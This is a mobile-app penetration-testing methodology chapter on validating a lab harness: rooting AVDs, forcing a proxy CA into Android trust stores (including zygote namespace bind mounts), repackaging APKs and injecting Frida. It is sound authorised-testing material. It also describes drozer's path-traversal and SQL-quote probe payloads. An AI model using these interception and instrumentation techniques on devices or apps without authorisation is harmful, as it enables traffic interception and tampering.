# D26 · Runtime Instrumentation, Tooling & Harness

> This domain files almost nothing. Its entire VRT footprint is `lack_of_binary_hardening.runtime_instrumentation_based` at **P5**, and its primary attacker model is AM-12 — you, on your own rooted device, which is not an attack. What it owns instead is the *validity of every other chapter's negative*: a harness that silently does not work produces "the app pins everything", "no exported components", "the hook never fired" and "drozer found nothing", each of which is a coverage lie that a client can be shown to have paid for.

| | |
|---|---|
| **Phases** | P1 lab & harness (build and acceptance), P2 acquisition (the static tool chain), P4 static deep review (the rule-set tools), P5 IPC & component attack (drozer, Frida, objection) |
| **Milestones** | M1, M5 |
| **VRT ceiling** | The domain's *own* ceiling is `lack_of_binary_hardening.runtime_instrumentation_based` (**P5**) and it must never be filed. The realistic ceiling is the finding the harness *carries*: `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (**P1**) when a sweep recovers a key the service actually honours, `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (**P1**) when the mobile-vs-web capture exposes a weaker shadow endpoint, `broken_authentication_and_session_management.authentication_bypass` (**P1**) when a shipped build is debuggable, `server_side_injection.sql_injection` (**P1**) when a manual provider probe lands where the scanner reported clean, and `cloud_security.misconfigured_services_and_apis.insecure_api_endpoints` (**P4**) for the device-as-pivot case |
| **Primary attacker model** | **AM-12 own rooted device — NOT AN ATTACK.** Every item here runs at AM-12 and must be converted before it is reported: to AM-03 (zero-permission local app), AM-05 (another user of the same app), or AM-01/AM-02 (remote) by re-deriving the result through a stock-reachable path. The one exception is D26-037, which runs at AM-04 |
| **Maps to** | MASVS-RESILIENCE (the whole group is what this domain *measures*, never what it reports), MASVS-CODE-4, MASVS-STORAGE-1, MASVS-NETWORK-1 as consumers; MASTG-TECH-0001, -0002, -0003, -0004, -0005, -0006, -0009, -0010, -0011, -0012, -0013, -0014, -0016, -0017, -0025, -0026, -0030, -0031, -0032, -0033, -0034, -0035, -0038, -0039, -0041, -0042, -0043, -0044, -0045, -0143, -0145, -0148, -0160, -0161, -0162, -0163, -0164, -0165, -0173; MASTG-TOOL-0001 (Frida (Android)), -0002 (MobSF (Android)), -0004 (adb), -0009 (APKiD), -0011 (Apktool), -0015 (drozer), -0017 (House), -0018 (jadx), -0019 (jdb), -0021 (Magisk), -0024 (Scrcpy), -0029 (objection (Android)), -0031 (Frida), -0032 (Frida CodeShare), -0036 (r2frida), -0037 (RMS), -0038 (objection), -0077 (Burp Suite), -0079 (ZAP), -0097 (mitmproxy), -0099 (FlowDroid), -0103 (uber-apk-signer), -0107 (jnitrace), -0110 (semgrep), -0112 (pidcat), -0116 (blutter), -0123 (apksigner), -0124 (aapt2), -0125 (Apkleaks), -0140 (frida-multiple-unpinning), -0146 (RootBeer), -0148 (apkeep), -0149 (LSPosed), -0152 (lldb (Android)); CWE-489 (Active Debug Code), CWE-749 (Exposed Dangerous Method or Function), CWE-200 (Exposure of Sensitive Information); ATT&CK T1617 Hooking, T1623.001 Unix Shell, T1632 Subvert Trust Controls, T1638 Adversary-in-the-Middle, T1521.003 SSL Pinning, T1633.001 System Checks, T1406 Obfuscated Files or Information |

## Why this domain pays

It does not pay directly, and any chapter that pretends otherwise is selling you a P5. Bugcrowd prices
runtime instrumentation at P5 with an all-zero impact vector; Google's Mobile VRP excludes "attacks that
require a rooted device"; Xiaomi, Grab and Spotify exclude "runtime hacking exploits using tools like
Frida/Appmon" by name. If your report contains the sentence "we were able to attach Frida and bypass the
root check", you have written an invoice for nothing.

What this domain pays for is **defensible negatives and unwasted days**. Two failure modes dominate real
engagements and both are harness defects wearing a finding's clothes. The first: on API 34+ the trust
store moved into the updatable Conscrypt APEX, so pushing a CA to `/system/etc/security/cacerts`
succeeds, `chmod` succeeds, and nothing is trusted — the app then fails TLS on *every* host, which looks
exactly like pinning. Testers report "the app pins all traffic" and the entire network and API section of
the engagement is never done. The second: a Frida hook placed on an abstract framework class
(`android.webkit.WebSettings`, `android.content.Context`, `SharedPreferences$Editor`) records nothing,
because the concrete type is `ContentSettingsAdapter`, `ContextImpl`, `SharedPreferencesImpl$EditorImpl`.
Zero events reads as "the app never enables file access" and the D10 finding is silently dropped. Neither
failure produces an error message. Both produce a clean-looking report.

The corpus gives one hard base rate worth carrying: drozer's `scanner.provider.injection` probes a
**single** `'` character and flags a result only when the resulting exception text contains
`unrecognized token`; `scanner.provider.traversal` fires **one** fixed payload — sixteen `../` levels at
`/etc/hosts` — and treats a non-empty read as its only oracle. Every provider that catches its own
exception, or wraps it, or that is traversable to a path other than `/etc/hosts`, is reported "Not
Vulnerable". That is not a tool quirk; it is the reason the highest-paid provider findings in the
disclosed-report corpus (H1 #291764, #242727) were all confirmed by a *manual* `app.provider.query` or
`adb shell content query` after the scanner had been run. The honest summary of this chapter is: it is
mostly graveyard, and the exception is that it decides whether the other twenty-six chapters are true.

## The crux question

**Before I write "not vulnerable" anywhere in this report: has this exact instrument produced a positive
result on this exact device in this session — and if the answer is "the tool printed nothing", what is my
positive control?**

## Triage order

1. **Run the harness acceptance script and keep the output** (D26-001). Every hour billed before this
   passes is an hour whose results may be void. The control-app TLS line is the load-bearing one.
2. **Lock Frida client/server/ABI versions and fire a control hook** (D26-010, D26-011). A version skew
   presents as "the app blocks instrumentation", which is a fabricated resilience finding.
3. **Get the trust store right for the device's API level** (D26-004, D26-005, D26-006). This one decision
   gates D14, D15, D18, D20 and D24 completely. Verify from *inside* the app's mount namespace.
4. **Pull the complete split set** (D26-018) before any static tool runs. A base-only analysis silently
   drops whole feature modules and every ABI-specific `.so`.
5. **Fingerprint the binary** (D26-023) before budgeting. APKiD tells you in three seconds whether the
   next three days are jadx reading or Blutter/Il2Cpp recovery, and it names the `.so` implementing the
   root check you will need to hook.
6. **Run the rule-set sweeps once, early** (D26-024, D26-025, D26-026, D26-027) and treat the output as a
   worklist, never as findings. The only sweep hit that has a severity of its own is a secret the remote
   service actually honours (D26-024).
7. **Stand up drozer and record the agent's own permission set** (D26-030) before running a single
   scanner. A module that returns nothing because the agent lacks a permission is not a negative result.
8. **Calibrate every scanner against a known-vulnerable control** (D26-063, D26-033) before the first
   "Not Vulnerable" line enters the ruled-out register.
9. **Then instrument** (D26-041 → D26-056), obeying the three correctness rules: abstract classes record
   nothing, `Java.choose` beats setter interception, and silence is never a negative.
10. **Apply the false-positive gate to every candidate** (D26-067 → D26-073) before anything is promoted
    out of Candidate. This is where retractions are prevented, and a retraction costs more than three
    real findings earn.
11. **Convert off AM-12 last** (D26-065, D26-066). A finding that only exists on your rooted device is a
    P5 until it is re-derived from an unprivileged app UID on a stock device.

## Items

### D26-001 · Run a green-baseline harness acceptance script before any billable testing

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — the gate that decides whether every other chapter's negative is defensible |
| **Attacker** | AM-12 (own device; not an attack) |
| **Applies to** | all dynamic engagements |
| **Maps to** | MASTG-TECH-0011 (Setting Up an Interception Proxy), MASTG-TECH-0001 (Accessing the Device Shell), MASTG-TOOL-0004 (adb), MASTG-TOOL-0001 (Frida (Android)) |

- **Test:** Prove, with a positive control, that the lab can actually produce the observations you are
  about to rely on: root, decrypted TLS *inside a forked app process*, Frida attach, install, screen
  capture and a lockscreen credential. Re-run after every reboot, `-wipe-data` and host OS update.
- **How:**
  ```bash
  #!/usr/bin/env bash
  # lab/verify-harness.sh <serial> <target-package> [control-package]
  set -u; P(){ printf '%-46s %s\n' "$1" "$2"; }
  S=${1:?serial}; PKG=${2:?package}; CTRL=${3:-com.android.chrome}
  adb -s "$S" shell id | grep -q 'uid=0(root)'   && P "root on research device" PASS || P "root" FAIL
  adb -s "$S" shell getprop ro.build.version.sdk | xargs -I{} P "API level" {}
  adb -s "$S" shell settings get global http_proxy | xargs -I{} P "proxy setting" {}
  # CA trust proven from INSIDE an app's mount namespace, not from the adb shell:
  adb -s "$S" shell am start -a android.intent.action.VIEW -d https://example.com >/dev/null
  sleep 4
  grep -q 'example.com' <(timeout 5 tail -n 50 ~/.mitmproxy/flows.log 2>/dev/null) \
    && P "control app TLS decrypts (positive control)" PASS || P "control app TLS" FAIL
  adb -s "$S" shell pm list packages | grep -q "$PKG" && P "target installed" PASS || P "target" FAIL
  adb -s "$S" shell pm path "$PKG" | wc -l | xargs -I{} P "splits installed (count)" {}
  frida-ps -U >/dev/null 2>&1 && P "frida device reachable" PASS || P "frida" FAIL
  frida --version; adb -s "$S" shell /data/local/tmp/frida-server --version
  adb -s "$S" exec-out screencap -p | wc -c | xargs -I{} P "screencap bytes" {}
  adb -s "$S" shell screenrecord --time-limit 2 /sdcard/_t.mp4 && adb -s "$S" shell rm /sdcard/_t.mp4 \
    && P "screenrecord works" PASS || P "screenrecord" FAIL
  adb -s "$S" shell locksettings get-disabled 2>/dev/null | xargs -I{} P "lockscreen disabled?" {}
  ```
  Save as `lab/harness-baseline-YYYYMMDD.txt` in the evidence tree.
- **Proof:** A saved baseline file where every line reads PASS. The **control-app TLS line** is the one
  that matters: it proves the CA bind reached a zygote-forked app process, so a later per-host TLS failure
  is pinning rather than lab breakage.
- **Escalation:** Gates D14 (pinning), D15 (API), D18 (cloud/SDK config), D20 (leakage), D24 (push).
  A mid-engagement FAIL invalidates every result produced since the last PASS, so the timestamps matter.
- **Ruled out when:** Not applicable as a finding. It is *satisfied* when the baseline file exists with
  all-PASS lines and its timestamp precedes every dynamic observation in the report. It is *failed* — and
  the engagement is paused — when any line reads FAIL, regardless of how the app behaves.

### D26-002 · Pin and record the lab manifest so the engagement is reproducible a year later

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-12 |
| **Applies to** | all |
| **Maps to** | `ro.build.fingerprint`, `ro.build.version.security_patch`; MASTG-TOOL-0004 (adb), MASTG-TOOL-0018 (jadx), MASTG-TOOL-0011 (Apktool), MASTG-TOOL-0123 (apksigner) |

- **Test:** Record exactly which binaries, images and patch levels produced the results, so a retest is a
  mirror copy of the original test rather than a different test.
- **How:**
  ```bash
  SERIAL=emulator-5554
  { date -u +%FT%TZ
    sw_vers 2>/dev/null || uname -a
    adb version | head -1
    emulator -version | head -1
    jadx --version; apktool --version; apksigner version 2>/dev/null
    frida --version; objection version 2>/dev/null | head -1; mitmdump --version | head -1
    python3 -V; java -version 2>&1 | head -1
    echo "AVD: $(adb -s $SERIAL emu avd name 2>/dev/null | head -1)"
    adb -s $SERIAL shell getprop ro.build.fingerprint
    adb -s $SERIAL shell getprop ro.build.version.security_patch
    adb -s $SERIAL shell /data/local/tmp/frida-server --version
  } | tee lab/LAB-MANIFEST.txt
  ```
- **Proof:** `LAB-MANIFEST.txt` shipped as a report appendix. `ro.build.fingerprint` and
  `ro.build.version.security_patch` are the two fields that settle "was this already patched?" arguments
  about any platform-adjacent claim.
- **Escalation:** Diff the manifest between the original test and the retest. Any delta must be called out
  in the retest report — a behaviour change may come from the platform, not from the vendor's fix (-> D27).
- **Ruled out when:** Not a finding. Satisfied when the manifest exists and the AVD can be rebuilt from it.

### D26-003 · Check all three rootable-AVD constraints before promising root-dependent work

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-12 |
| **Applies to** | emulator-based labs; Apple Silicon hosts especially |
| **Maps to** | MASTG-TOOL-0021 (Magisk) as the fallback route |

- **Test:** Three *independent* constraints decide whether an AVD can be rooted at all. Check all three
  before quoting any deliverable that needs root (system CA, `/data/data` reads, frida-server).
- **How:**
  ```bash
  # 1. image variant: google_apis is rootable; google_apis_playstore NEVER is
  sdkmanager --list | grep -E 'system-images;android-3[3-6];google_apis(_ps16k)?;'
  sdkmanager --install "system-images;android-35;google_apis;arm64-v8a"
  echo no | avdmanager create avd -n pt -k "system-images;android-35;google_apis;arm64-v8a"
  emulator -avd pt -writable-system -no-snapshot &
  adb wait-for-device
  adb root 2>&1        # "adbd cannot run as root in production builds" => NOT rootable, stop here
  adb shell id         # must print uid=0(root)
  adb shell getprop ro.debuggable; adb shell which su || echo "no su"
  ```
  2. On **Apple Silicon** the image must also be a **`ps16k`** (16 KB page size) variant; a plain
     `arm64-v8a` image boots to `ERROR | detected a hanging thread 'QEMU2 main loop'` and never reaches
     `sys.boot_completed`.
  3. The `ps16k` + `google_apis` combination does not exist at every API level and not every one that
     exists boots. Observed in the corpus: API 37 had no such image, 36.1 hung indefinitely, **35 booted
     and gave `uid=0(root)`**. Budget for image-hunting and say so up front rather than after four failed
     boots.
- **Proof:** `adb shell id` printing `uid=0(root)`, and `sys.boot_completed` reached.
- **Escalation:** Without root there is no system-CA MitM and no app-private storage read; fall back to
  D26-008 (NSC repack) and D26-009 (gadget) and state the cost in the report's limitations.
- **Ruled out when:** Not a finding. The constraint is *resolved* when `adb shell id` returns uid 0; it is
  *unresolvable* on a `google_apis_playstore` image, which is a platform property of `user` builds and
  must be recorded as a harness fact, never as an app observation.

### D26-004 · Install the proxy CA into the system store — API 33 and below

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none; note `mobile_security_misconfiguration.ssl_certificate_pinning.defeatable` is **P5** — the bypass is never the finding |
| **Attacker** | AM-07 network attacker with a trusted CA — **tester convenience, not an attacker model** |
| **Applies to** | devices at API ≤ 33. **targetSdk < 24** apps trust user CAs and need none of this — if traffic decrypts from the *user* store, that is a D14 finding, record it |
| **Maps to** | MASTG-TECH-0011 (Setting Up an Interception Proxy), MASTG-TECH-0010 (Basic Network Monitoring/Sniffing), MASTG-TOOL-0077 (Burp Suite), MASTG-TOOL-0097 (mitmproxy), MASTG-TOOL-0079 (ZAP); ATT&CK T1638, T1632 |

- **Test:** Put the proxy CA where a `targetSdk >= 24` app will actually trust it, and route traffic.
- **How:**
  ```bash
  emulator -avd pt -writable-system -no-snapshot &
  adb wait-for-device && adb root && adb remount
  openssl x509 -inform DER -in cacert.der -out burp.pem            # skip if already PEM
  HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp.pem | head -1)   # e.g. 9a5ba580
  cp burp.pem "${HASH}.0"
  adb push "${HASH}.0" /system/etc/security/cacerts/
  adb shell chmod 644 "/system/etc/security/cacerts/${HASH}.0"
  adb reboot && adb wait-for-device
  adb shell settings put global http_proxy 10.0.2.2:8080    # 10.0.2.2 = host, from inside the emulator
  #  physical device: use the host's LAN IP, not 10.0.2.2
  # teardown, every time:
  adb shell settings delete global http_proxy
  adb shell settings delete global global_http_proxy_host
  adb shell settings delete global global_http_proxy_port
  ```
- **Proof:** The app's HTTPS decoded in the proxy **with no Frida attached** — that is what separates
  "not pinned" from "pinning bypassed", and only the first supports a clean D15 section.
- **Escalation:** -> D14 (pinning layer identification), D15 (API/authz), D18 (cloud config), D20, D24.
- **Ruled out when:** The device is API 34+ — then this procedure is a no-op that *appears* to succeed
  (the push and `chmod` both return 0 and nothing is trusted) and D26-005 is mandatory instead. Skipping
  the teardown leaves a stale proxy setting, whose symptom is WebView `ERR_PROXY_CONNECTION_FAILED`
  (see D26-017).

### D26-005 · API 34+: the Conscrypt APEX trust store and the zygote mount-namespace bind

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-07 (tester convenience, not an attacker) |
| **Applies to** | **API 34+** (Android 14/15/16), and Conscrypt-Mainline-updated 12/13. Root required |
| **Maps to** | AOSP Zygote fork semantics ("at Zygote fork time, we create a mount namespace for each running app"); AOSP APEX file format (apexd loop + dm-verity mount, versioned path plus bind mount); MASTG-TECH-0011; ATT&CK T1632 |

- **Test:** On API 34+ the system trust store lives in the updatable Conscrypt APEX and
  `/system/etc/security/cacerts` is **ignored at runtime**. Every app process is forked from the zygote
  and inherits *its* mount namespace, and `/apex` is mounted PRIVATE — so a bind mount made in the adb
  shell's namespace never reaches app processes. Do both halves or you will conclude "the app pins".
- **How:**
  ```bash
  # 1. stage a writable copy of the trust store
  adb shell su -c '
    mkdir -p /data/local/tmp/cacerts
    cp /apex/com.android.conscrypt/cacerts/* /data/local/tmp/cacerts/ 2>/dev/null
    cp /system/etc/security/cacerts/* /data/local/tmp/cacerts/ 2>/dev/null'
  # 2. add your CA in the hashed-name form Conscrypt expects
  HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp.pem | head -1)
  adb push burp.pem /data/local/tmp/cacerts/${HASH}.0
  # 3. tmpfs over the legacy dir, populate, label
  adb shell su -c '
    mount -t tmpfs tmpfs /system/etc/security/cacerts
    cp /data/local/tmp/cacerts/* /system/etc/security/cacerts/
    chown root:root /system/etc/security/cacerts/*; chmod 644 /system/etc/security/cacerts/*
    chcon u:object_r:system_security_cacerts_file:s0 /system/etc/security/cacerts/* 2>/dev/null || \
    chcon u:object_r:system_file:s0 /system/etc/security/cacerts/*'
  # 4. THE STEP EVERYONE MISSES — inject into the zygote mount namespace
  adb shell su -c '
    for Z in $(pidof zygote) $(pidof zygote64); do
      nsenter --mount=/proc/$Z/ns/mnt -- /bin/mount --bind \
        /system/etc/security/cacerts /apex/com.android.conscrypt/cacerts
    done'
  # 5. and into every already-running app process
  adb shell su -c '
    for P in $(ls /proc | grep -E "^[0-9]+$"); do
      nsenter --mount=/proc/$P/ns/mnt -- /bin/mount --bind \
        /system/etc/security/cacerts /apex/com.android.conscrypt/cacerts 2>/dev/null
    done'
  ```
  Use `--rbind` instead of `--bind` when `/system/etc/security/cacerts` already carries nested mounts
  (common under Magisk modules). The bind is **runtime only** — re-run after every reboot. An alternative
  is to bind on `init` (PID 1) and then `stop && start` for a soft reboot.
- **Proof:** The symptom of skipping step 4 is
  `Client TLS handshake failed ... does not trust the proxy's certificate` for **every** host — which is
  indistinguishable from pinning by behaviour alone. After the bind, the control app's traffic decrypts
  (D26-001) and `Settings -> Trusted credentials -> SYSTEM` lists the proxy CA.
- **Escalation:** -> D14, D15, D18, D20, D24. Without it those chapters cannot produce a defensible
  negative at all.
- **Ruled out when:** The device is API ≤ 33 (D26-004 suffices), or the app declares a
  `networkSecurityConfig` that trusts `user` anchors (then the user store is enough — and the NSC itself
  is a D14 finding). **LEGACY:** on ≤ 33 a plain `/system` remount is sufficient and the `nsenter` step is
  unnecessary.

### D26-006 · Verify which trust store the target process actually sees, not which one your shell sees

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-12 |
| **Applies to** | all; decisive on API 34+ |
| **Maps to** | AOSP Zygote / per-app mount-namespace model; AOSP APEX bind-mount model |

- **Test:** The adb shell and the target app live in different mount namespaces. Confirm the app's own
  view before you accept any TLS result.
- **How:**
  ```bash
  PKG=com.target.app
  PID=$(adb shell pidof $PKG | tr -d '\r')
  adb shell su -c "nsenter --mount=/proc/$PID/ns/mnt -- ls /apex/com.android.conscrypt/cacerts | wc -l"
  adb shell su -c "nsenter --mount=/proc/$PID/ns/mnt -- ls /system/etc/security/cacerts | wc -l"
  adb shell "cat /proc/$PID/mountinfo" | grep -E 'cacerts|conscrypt'
  adb shell readlink /proc/$PID/ns/mnt ; adb shell readlink /proc/self/ns/mnt   # different inodes
  ```
- **Proof:** Two different mount-namespace inode numbers and two different directory listings — that
  difference *is* the proof that namespaces matter. Your CA present in the app's view is the green light.
- **Escalation:** -> D14. Attach this output to any "the app pins host X" claim.
- **Ruled out when:** The two `readlink` values are identical (a rare, non-zygote-forked process), or the
  device is API ≤ 33 where the legacy path is authoritative. A count mismatch with your CA *absent* from
  the app's view means D26-005 step 4 did not take, and every TLS negative in the session is void.

### D26-007 · `system.certs.enabled` — the per-process switch back to the legacy trust store

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-12 |
| **Applies to** | API 34+ builds whose Conscrypt implements the check; must be set **before** the app's first TLS use, hence spawn mode |
| **Maps to** | Conscrypt `SystemCertificateSource`, quoted in the OverrideSysPropModule README: `if ((System.getProperty("system.certs.enabled") != null) && (System.getProperty("system.certs.enabled")).equals("true")) { return new File(System.getenv("ANDROID_ROOT") + "/etc/security/cacerts"); }` |

- **Test:** Where namespace surgery is impractical, flip the app's own Conscrypt source back to
  `$ANDROID_ROOT/etc/security/cacerts` from inside the process.
- **How:**
  ```javascript
  // frida -U -f com.target.app -l certs.js --no-pause
  Java.perform(function () {
    var S = Java.use('java.lang.System');
    S.setProperty('system.certs.enabled', 'true');
    console.log('[+] system.certs.enabled = ' + S.getProperty('system.certs.enabled'));
  });
  ```
  Combine with a populated `/system/etc/security/cacerts` (D26-005 steps 1–3).
- **Proof:** The property reading back as `true`, and the app's TLS traffic appearing in the proxy with no
  `nsenter` step performed.
- **Escalation:** -> D14, D15.
- **Ruled out when:** The property reads back `true` and TLS still fails on every host — then the
  legacy directory was never populated (steps 1–3), or this Conscrypt build does not implement the check
  and D26-005 is the only route. Note that this path requires code execution in the process, so it is
  strictly weaker evidence than a system-store install: any finding captured under it must say so.

### D26-008 · Non-root MitM: repack with a network security config that trusts user CAs

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-07 (tester convenience) |
| **Applies to** | stock non-rooted handsets; apps that do **not** verify their own signature |
| **Maps to** | MASTG-TECH-0004 (Repackaging Apps), MASTG-TECH-0039 (Repackaging & Re-Signing), MASTG-TECH-0011, MASTG-TOOL-0011 (Apktool), MASTG-TOOL-0103 (uber-apk-signer), MASTG-TOOL-0123 (apksigner) |

- **Test:** When no rootable image is available, add a debug-friendly NSC and re-sign.
- **How:**
  ```bash
  apktool d -o out target.apk
  cat > out/res/xml/nsc.xml <<'XML'
  <network-security-config>
    <base-config cleartextTrafficPermitted="true">
      <trust-anchors>
        <certificates src="system"/>
        <certificates src="user"/>
      </trust-anchors>
    </base-config>
  </network-security-config>
  XML
  # point android:networkSecurityConfig="@xml/nsc" at it in out/AndroidManifest.xml, then:
  apktool b -o patched.apk out
  zipalign -p -f 4 patched.apk aligned.apk
  apksigner sign --ks my.keystore aligned.apk
  adb install-multiple <every split, all signed with the SAME key>
  ```
- **Proof:** HTTPS now decrypts with the CA in the **user** store on a stock device.
- **Escalation:** -> D14, D15. Also a D02 data point: if the app refuses to run after re-signing, it
  verifies its own signature, which is a resilience observation, not a defect.
- **Ruled out when:** The app enforces its own signature or a Play Integrity `appRecognitionVerdict` —
  then the repack fails by design and the result says nothing about the app's network posture. **Cost,
  which must be stated in the report:** re-signing changes the certificate, so the existing signed-in
  session is lost and any integrity check fails; attribute later behaviour changes to your patch, not to
  the app.

### D26-009 · Non-root instrumentation: objection `patchapk` / Frida gadget injection

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — but it removes the "requires root" discount, which is worth one to two severity bands on the finding it carries |
| **Attacker** | AM-12 becoming AM-11 (physical unlocked) |
| **Applies to** | all; fails against apps that verify their own signature unless `PackageManager.getPackageInfo()` is also spoofed |
| **Maps to** | MASTG-TECH-0026 (Dynamic Analysis on Non-Rooted Devices), MASTG-TECH-0041 (Library Injection), MASTG-TECH-0038 (Patching), MASTG-TECH-0039; MASTG-TOOL-0029 (objection (Android)), MASTG-TOOL-0103 (uber-apk-signer), MASTG-TOOL-0011 (Apktool) |

- **Test:** Embed the Frida gadget in the APK so instrumentation works with no device compromise, which
  materially changes how the resulting finding is rated.
- **How:**
  ```bash
  objection patchapk --source target.apk            # or: objection patchapk -s target.apk -a arm64
  adb install -r target.objection.apk
  objection explore
  # manual equivalent:
  apktool d -o out target.apk
  cp frida-gadget-<ver>-android-arm64.so out/lib/arm64-v8a/libgadget.so
  # add  System.loadLibrary("gadget")  to the Application/first-Activity <clinit> smali
  apktool b -o patched.apk out
  java -jar uber-apk-signer.jar -a patched.apk --out signed
  adb install signed/patched-aligned-debugSigned.apk
  frida -U -n Gadget -l script.js
  ```
- **Proof:** The patched app pausing at launch until the Frida client connects, then hooks firing — on a
  stock, non-rooted device. Say exactly that in the report.
- **Escalation:** Combine with `bmgr` backup extraction (D11/D03) and `run-as` on debuggable builds (D02):
  three no-root data paths that convert P5 storage observations into findings with a real attacker model.
- **Ruled out when:** The app refuses to run after repacking (self-signature check or integrity
  attestation). Prefer frida-server on a rooted emulator wherever possible: **repackaging re-signs the app,
  which destroys the existing signed-in session and invalidates every self-signature check**, and losing a
  hard-won authenticated session mid-engagement is a real cost.

### D26-010 · Lock Frida client, server and ABI versions — and prove it with a control hook

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-12 |
| **Applies to** | all Frida-based work |
| **Maps to** | MASTG-TOOL-0001 (Frida (Android)), MASTG-TOOL-0031 (Frida); ATT&CK T1617 Hooking, T1623.001 Unix Shell |

- **Test:** A version or ABI mismatch fails in ways that look exactly like target hardening — attach
  hangs, `frida-ps -U` lists nothing, or scripts load and silently never fire. Assert equality, then fire
  a hook that *cannot* be absent in a running app.
- **How:**
  ```bash
  adb shell getprop ro.product.cpu.abi           # must match the frida-server build
  HOST=$(frida --version)
  adb push frida-server-${HOST}-android-arm64 /data/local/tmp/frida-server
  adb shell "chmod 755 /data/local/tmp/frida-server"
  adb shell "su -c '/data/local/tmp/frida-server &'"
  DEV=$(adb shell /data/local/tmp/frida-server --version | tr -d '\r')
  [ "$HOST" = "$DEV" ] || { echo "VERSION MISMATCH host=$HOST device=$DEV — fix before testing"; exit 1; }
  frida-ps -Uai | head
  # positive control: a hook that cannot be absent
  frida -U -n com.target.app -q -e '
  Java.perform(function(){
    var L = Java.use("android.util.Log");
    L.i.overload("java.lang.String","java.lang.String").implementation = function(a,b){
      console.log("[CTRL] Log.i " + a); return this.i(a,b); };
    console.log("[CTRL] hook installed");
  });'
  ```
- **Proof:** `[CTRL] hook installed` followed by at least one `[CTRL] Log.i` line within seconds of
  touching the app. **No control output means the instrument is broken and every negative from this
  session is void.**
- **Escalation:** Record the control-hook output path in the ruled-out register next to every dynamic
  negative, so each negative carries its own proof of instrument validity (-> D27).
- **Ruled out when:** Versions match, the control hook fires, and the *target's* hook still does not — only
  then is "the app resists instrumentation" a hypothesis worth pursuing in D21. Note the failure is
  symmetrical: a running frida-server is also exactly ATT&CK T1623.001's "spawn of sh/toybox/toolbox/su or
  equivalent shell process", so expect the app's RASP to see it.

### D26-011 · Frida 17+ moved the Java bridge out of GumJS — an agent with no `Java` object records nothing

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-12 |
| **Applies to** | Frida 17+ for **compiled** agents. The Frida REPL and `frida-trace` are exempt |
| **Maps to** | Frida JavaScript API docs, `Java` section (`Java.available`, `Java.androidVersion`) |

- **Test:** Confirm the `Java` namespace exists in your agent before concluding a Java hook "did not fire".
- **How:** The Frida docs state verbatim: *"As of Frida 17, this runtime bridge is no longer baked into
  Frida's GumJS runtime, and can be fetched by running: `npm install frida-java-bridge` ... Import it into
  your agent like this: `import Java from 'frida-java-bridge';` ... For now this is not needed in scripts
  loaded by the Frida REPL, as well as frida-trace."* Put this at the top of every compiled agent:
  ```javascript
  if (!Java.available) {
    console.error('[!] No Java VM — this is not Android, or the bridge is missing');
  } else {
    console.log('[+] Android ' + Java.androidVersion);
  }
  ```
- **Proof:** `Java.available === true` plus a printed `Java.androidVersion`. A
  `ReferenceError: Java is not defined` in a `frida-compile`d agent is the missing-bridge case — **not**
  an app defence.
- **Escalation:** With a correct bridge, every hook in D26-041 → D26-056 becomes usable.
- **Ruled out when:** You are running the script through the Frida REPL or `frida-trace`, which still ship
  the bridge. Misdiagnosing this as anti-instrumentation costs an engagement day and produces a fabricated
  "the app blocks Frida" resilience finding.

### D26-012 · Run the two-device lab: rooted device for discovery, stock device for proof

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none directly; it is what moves a finding off `lack_of_binary_hardening.*` (P5) into a real category |
| **Attacker** | AM-12 for the research device; the user device *is* the attacker's real environment |
| **Applies to** | all |
| **Maps to** | Google Mobile VRP reporting guidance (device/build in text, not screenshots; warn about emulators and rooted devices); AOSP severity modifiers (unlocked bootloader / Developer Mode -> "No higher than Low") |

- **Test:** Keep two devices with the same account and the same build. Discover on the rooted one; prove
  on the stock one. The pair is also the strongest sandbox evidence there is.
- **How:**

  | Role | Image | Root | Use it for |
  |---|---|---|---|
  | **User device** (the victim's reality) | `google_apis_playstore_ps16k` | **No** — `uid=2000(shell)`, `adb root` refused by design | Every exploit demonstration; baseline denial (`cat` -> `Permission denied`, `run-as` -> `not debuggable`); anything where "requires root" would sink the finding |
  | **Research device** (evidence + instrumentation) | `google_apis_ps16k` | **Yes** — `adb root` -> `uid=0(root)` | Showing what a read primitive reaches; verifying storage claims; system-CA install; confirming a *negative* ("card data is never persisted") |

  ```bash
  for S in emulator-5554 emulator-5556; do
    echo "== $S"; adb -s $S shell getprop ro.product.model
    adb -s $S shell getprop ro.build.version.release
    adb -s $S shell getprop ro.build.display.id
    adb -s $S shell getprop ro.build.version.security_patch
    adb -s $S shell id
  done
  # keep the same build on both:
  for p in $(adb -s emulator-5556 shell pm path com.target.app | sed 's/package://' | tr -d '\r'); do
    adb -s emulator-5556 pull "$p" ./apk/; done
  adb -s emulator-5554 install-multiple ./apk/*.apk
  ```
- **Proof:** A single take showing the non-rooted device refusing the read and the rooted device
  displaying the contents. All four `getprop` values pasted as **text** in the report — Google's guidance
  is explicit that device/build go in text, not in a screenshot.
- **Escalation:** -> D27. This is the difference between a payable report and a P5, and it dodges the
  whole D21 root-discount argument.
- **Ruled out when:** Not a finding. **Device inventory rots — verify it, never trust a file for it:** run
  `adb -s <serial> shell pm list packages -3` at the start of every session. Prefer `-wipe-data` only on
  the research device; wiping the user device's logged-in state is expensive.

### D26-013 · Physical-device lane: wireless debugging, the two-port trap, and the proxy path

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | AM-12 |
| **Applies to** | Android 11+ physical devices |
| **Maps to** | `adb pair` / `adb connect`; `settings put global http_proxy`; MASTG-TOOL-0004 (adb), MASTG-TOOL-0024 (Scrcpy) |

